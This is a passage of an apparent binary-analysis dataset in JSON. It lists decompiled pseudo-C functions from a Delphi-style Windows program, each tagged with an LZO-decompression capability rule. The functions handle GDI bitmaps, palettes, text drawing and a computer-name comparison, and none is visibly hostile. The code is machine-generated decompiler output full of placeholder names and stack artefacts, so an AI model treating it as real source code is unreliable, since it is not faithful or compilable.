*in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403aac();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00404610();\n            if (arg_8h == 0) {\n                fcn.00403aac();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x429916;\n            fcn.0041b8f0(in_ECX - var_20h, 0);\n            uStack224 = 0x429926;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.004251a4();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041b880();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.00425434();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041b880();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.00425454();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.00425700();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.004252c4();\n    uStack224 = 0x429bff;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x490b94 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.00429790::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x429b85;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x429b99;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x429ba2;\n                fcn.004251a4();\n            }\n            else {\n                puStack256 = 0x429ba9;\n                fcn.0040f1e0();\n            }\n        }\n        uStack260 = 0x429bce;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x429bc4;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041b880();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x429c06;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x429bfe;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x429a41;\n    lpbInit = fcn.00402ef0();\n    uStack236 = 0x429b67;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x429a5f;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041b880();\n    uStack244 = hdc;\n    piStack248 = 0x429a68;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x429a6d;\n    var_10h = fcn.004252c4();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x429a7d;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x429a87;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x429aa5;\n        uStack272 = fcn.004259bc();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x429ab7;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x429ac3;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x429b3b;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.004251a4();\n        }\n        else {\n            fcn.0040f1e0();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x429b42);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2154
    },
    "0042b708": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042b7d9)\n// WARNING: Removing unreachable block (ram,0x0042b7ef)\n\nvoid __fastcall fcn.0042b708(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uVar4;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint nSize;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack108 = 0x42b735;\n    var_10h = param_2;\n    fcn.00405f08();\n    uStack112 = 0x42b8a9;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    if (*0x490e78 == NULL) {\n        puStack108 = &stack0xfffffffc;\n        fcn.0040db2c();\n        fcn.00404eb4();\n    }\n    fcn.00403aac();\n    var_24h = fcn.00405dd8();\n    var_38h = *0x42b8b8;\n    uStack56 = *0x42b8bc;\n    uStack52 = *0x42b8c0;\n    uStack48 = *0x42b8c4;\n    var_ch = &fcn.0042b708::var_38h;\n    fcn.004070f8();\n    var_4h = 0;\n    iVar1 = fcn.00405de8();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(&fcn.0042b708::lpBuffer, &fcn.0042b708::nSize);\n        if (iVar1 == 0) {\n            bVar3 = false;\n        }\n        else {\n            fcn.004056dc();\n            fcn.004056f4();\n            fcn.004056f4(0);\n            uVar2 = fcn.004058fc();\n            fcn.004056dc(0, uVar2);\n            uVar2 = fcn.004058fc();\n            iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            bVar3 = iVar1 == 2;\n        }\n        if (bVar3) {\n            uVar2 = 0x15;\n        }\n        else {\n            uVar2 = 0x10;\n        }\n    }\n    uVar4 = var_10h;\n    (**0x490e78)(var_10h, 0, uVar2, &fcn.0042b708::var_28h, 1, &fcn.0042b708::var_ch);\n    fcn.0042b52c();\n    fcn.0042b52c();\n    fcn.00407110();\n    *in_FS_OFFSET = uVar4;\n    fcn.00405490(0x42b8b0);\n    fcn.00405fcc();\n    return;\n}\n",
        "token_count": 823
    },
    "0042bbdc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bbdc(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    int16_t **ppiVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *in_EAX;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    int32_t *piStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    int32_t *piStack1644;\n    uint uStack1640;\n    uchar *puStack1636;\n    uint32_t var_650h;\n    uint bstrString;\n    int32_t aiStack592 [127];\n    uint *var_50h;\n    uint *var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int16_t **var_40h;\n    int16_t **var_3ch;\n    int16_t **var_38h;\n    int16_t **var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint *var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    \n    puStack1648 = &stack0xfffffffc;\n    puStack1636 = 0x42bbfe;\n    var_24h = in_EAX;\n    fcn.00405f08();\n    uStack1640 = 0x42bf07;\n    piStack1644 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff994;\n    var_30h = 0;\n    uStack1652 = 0x42bee4;\n    piStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    var_48h = in_EDX[1];\n    puVar2 = &stack0xfffffffc;\n    puStack1636 = &stack0xfffffffc;\n    if (0x40 < var_48h) {\n        puStack1636 = &stack0xfffffffc;\n        fcn.0040db2c();\n        fcn.00404eb4();\n        puVar2 = puStack1648;\n    }\n    puStack1648 = puVar2;\n    if (var_48h != 0) {\n        var_34h = arg_ch;\n        var_38h = &fcn.0042bbdc::var_650h + var_48h * 4;\n        uVar7 = 0;\n        do {\n            ppiVar1 = var_34h;\n            var_38h = var_38h + -4;\n            var_2ch = in_EDX[uVar7 + 3] & 0x7f;\n            uVar3 = in_EDX[uVar7 + 3] & 0x80;\n            if (var_2ch == 0xa) {\n                *var_38h = 0xa;\n                var_38h[2] = 0x80020004;\n            }\n            else {\n                if (var_2ch == 0x48) {\n                    var_3ch = &fcn.0042bbdc::bstrString + var_30h * 2;\n                    if (uVar3 == 0) {\n                        piVar5 = fcn.004063bc();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = NULL;\n                        *var_38h = 0x8;\n                        var_38h[2] = *var_3ch;\n                    }\n                    else {\n                        piVar5 = fcn.004063bc();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = *var_34h;\n                        *var_38h = 0x4008;\n                        var_38h[2] = var_3ch;\n                    }\n                    var_30h = var_30h + 1;\n                }\n                else if (uVar3 == 0) {\n                    if (var_2ch == 0xc) {\n                        if (*var_34h == 0x100) {\n                            var_40h = &fcn.0042bbdc::bstrString + var_30h * 2;\n                            piVar5 = fcn.004063bc();\n                            *var_40h = piVar5;\n                            var_40h[1] = NULL;\n                            *var_38h = 0x8;\n                            var_38h[2] = *var_40h;\n                            var_30h = var_30h + 1;\n                        }\n                        else {\n                            *var_38h = *var_34h;\n                            var_38h[1] = ppiVar1[1];\n                            var_38h[2] = ppiVar1[2];\n                            var_38h[3] = ppiVar1[3];\n                            var_34h = var_34h + 3;\n                        }\n                    }\n                    else {\n                        *var_38h = var_2ch;\n                        var_38h[2] = *var_34h;\n                        if ((4 < var_2ch) && (var_2ch < 8)) {\n                            var_34h = var_34h + 1;\n                            var_38h[3] = *var_34h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_2ch == 0xc) && (**var_34h == 0x100)) {\n                        fcn.00411ce0();\n                    }\n                    *var_38h = var_2ch | 0x4000;\n                    var_38h[2] = *var_34h;\n                }\n                var_34h = var_34h + 1;\n            }\n            uVar7 = uVar7 + 1;\n        } while (var_48h != uVar7);\n    }\n    var_50h = &fcn.0042bbdc::var_650h;\n    var_4ch = var_28h + 1;\n    var_44h = in_EDX[2];\n    uVar9 = *var_28h;\n    cVar4 = *in_EDX;\n    if (cVar4 == '\\x04') {\n        if ((var_650h & 0xfff) == 9) {\n            cVar4 = '\\b';\n        }\n        *var_28h = 0xfffffffd;\n        var_4ch = var_28h;\n        var_44h = var_44h + 1;\n    }\n    else if (((cVar4 == '\\x01') && (var_48h == 0)) && (arg_8h != 0)) {\n        cVar4 = '\\x03';\n    }\n    iVar6 = (**(*var_24h + 0x18))\n                      (var_24h, uVar9, *0x4927ec, 0, cVar4, &fcn.0042bbdc::var_50h, arg_8h, &fcn.0042bbdc::var_20h, 0);\n    iVar8 = var_30h;\n    if (iVar6 != 0) {\n        fcn.0042c1b4();\n        iVar8 = var_30h;\n    }\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        if (*(&stack0xfffffdb0 + iVar8 * 8) != 0) {\n            fcn.00406398();\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    iVar8 = var_30h;\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar9, (&fcn.0042bbdc::bstrString)[iVar8 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1779
    },
    "00430a1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430a1c(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    param_2 = param_2 + 1;\n    fcn.004058fc();\n    fcn.004308b8(param_2);\n    return;\n}\n",
        "token_count": 87
    },
    "00433150": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00433150(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.004058fc();\n        fcn.004058fc(uVar1);\n        iVar2 = fcn.00409ad4();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.004059a4();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 218
    },
    "004331d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043329f)\n\nvoid fcn.004331d8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x4331f1;\n    fcn.004058ec();\n    uStack40 = 0x4332fb;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00433150();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00433150();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00433150(),  cVar1 != '\\0')) || (cVar1 = fcn.00433150(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00432f58();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.004058fc(0);\n            fcn.004058fc(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x433302;\n    uStack40 = 0x4332f2;\n    fcn.0040546c();\n    uStack40 = 0x4332fa;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 486
    },
    "00433efc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433f48)\n// WARNING: Removing unreachable block (ram,0x00433f52)\n\nvoid __cdecl fcn.00433efc(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x4340e8;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.00435f78();\n    if ((iVar2 != 0) && (cVar1 = fcn.004377f8(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.00405504();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.00405738();\n    }\n    fcn.00405894();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.00424ec0(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x004340d2;\n    }\n    fcn.00424948();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.004242f0();\n        fcn.004242fc();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.00423f70();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.004058fc(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.00424ec0(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.00423aa4();\n            iVar4 = fcn.00423aa4();\n            if (iVar2 == iVar4) {\n                fcn.00423f70();\n                goto code_r0x004340a9;\n            }\n        }\n        fcn.00423f70();\n    }\ncode_r0x004340a9:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.004058fc(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.00424ec0(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x004340d2:\n    *in_FS_OFFSET = uStackY120;\n    fcn.0040546c(0x4340ef);\n    return;\n}\n",
        "token_count": 968
    },
    "00436424": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436424(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x436567;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x492ae0 + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.004059ec();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.00405964(&var_14h);\n        fcn.00405894();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.00405964(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.00405800(0x43657c, 0x4365a0, var_4h, 0x436594, 0x436588, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x4365a0;\n            fcn.00405800(0x4365a0, var_4h, 0x436594, 0x436588, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405490(0x43656e);\n    return;\n}\n",
        "token_count": 761
    },
    "004365a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004365a4(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x436a2c;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004365a4::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x4365e5;\n            cVar2 = fcn.00436be4();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x004365ed;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x436a33;\n        var_20h = 0x436a16;\n        fcn.00405490();\n        var_20h = 0x436a23;\n        fcn.00405490();\n        var_20h = 0x436a2b;\n        fcn.0040546c();\n        return;\n    }\ncode_r0x004365ed:\n    var_1ch = puVar1;\n    _auStack44 = 0x4365fb;\n    fcn.00405504();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x4369f5;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x43662e;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00404610();\n    var_34h = 0x43663d;\n    var_14h = fcn.00404610();\n    var_34h = 0x43664c;\n    var_2ch = fcn.00404610();\n    var_34h = 0x43665b;\n    var_8h = fcn.00404610();\n    var_34h = 0x436665;\n    iVar3 = fcn.004359b8();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43667d;\n            iVar3 = fcn.004359c8();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x436690;\n                fcn.004359c8();\n                var_34h = 0x43669d;\n                fcn.00405894();\n                if (!uVar7) {\n                    var_34h = 0x4366ac;\n                    iVar3 = fcn.004359c8();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x4366bf;\n                        fcn.004359c8();\n                        var_34h = 0x4366ca;\n                        fcn.0043879c();\n                        var_34h = 0x4366d5;\n                        fcn.00409754();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x4366e4;\n                            var_34h = fcn.004359c8();\n                            var_38h = 0x4366ee;\n                            fcn.004359c8();\n                            var_38h = 0x4366fb;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x43670b;\n                            iVar3 = fcn.0040e840();\n                            if (iVar3 != 0) {\n                                var_38h = 0x436718;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.00436370(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x436726;\n                                    iVar3 = fcn.004359c8();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x436733;\n                                    fcn.004359c8();\n                                    var_38h = 0x43673e;\n                                    fcn.004386ac();\n                                    var_34h = 0x436747;\n                                    fcn.004054c0();\n                                    var_34h = 0x436750;\n                                    var_34h = fcn.004359c8();\n                                    var_38h = 0x43675a;\n                                    fcn.004359c8();\n                                    var_38h = 0x436767;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x43677c;\n    fcn.00405504();\n    var_34h = 0x436784;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43679c;\n            fcn.00405504();\n            var_34h = 0x4367a7;\n            (**(*var_14h + 8))();\n            var_34h = 0x4367af;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x4367b7;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x4367d0;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x436874;\n                        iVar5 = fcn.0040572c();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x492ae0 + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.004365a4::var_40h;\n                            var_38h = 0x436806;\n                            fcn.00405964();\n                            var_38h = 0x436811;\n                            fcn.00409754();\n                            var_3ch = 0x43681a;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.00436370(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x492b04 + 0xc) == '\\0') {\n                                    var_38h = 0x436848;\n                                    fcn.004059ec();\n                                }\n                                else {\n                                    var_38h = 0x436837;\n                                    fcn.00436424();\n                                }\n                                var_38h = 0x436852;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x43685f;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x436869;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x43688e;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x436899;\n                var_34h = &stack0xfffffffc;\n                fcn.004363a0(&stack0xfffffffc);\n            }\n            var_34h = 0x4368a2;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x4368ae;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x4368c2;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x4368cc;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x4368d6;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x4368e3;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x4368fc;\n        var_34h = &stack0xfffffffc;\n        fcn.004363a0(&stack0xfffffffc);\n    }\n    var_34h = 0x436905;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x436913;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x43692f;\n            (**(*var_8h + 0xc))();\n            if (*(*0x492b04 + 0xc) != '\\0') {\n                var_34h = 0x436947;\n                iVar3 = fcn.0040e840();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x43695e;\n                    iVar3 = fcn.0040e840();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.004365a4::var_44h;\n                        var_38h = 0x436981;\n                        fcn.00405964();\n                        var_38h = 0x43698e;\n                        fcn.00436424();\n                        var_38h = 0x4369a8;\n                        fcn.004059a4();\n                    }\n                }\n            }\n            var_34h = 0x4369b2;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x4369bd;\n            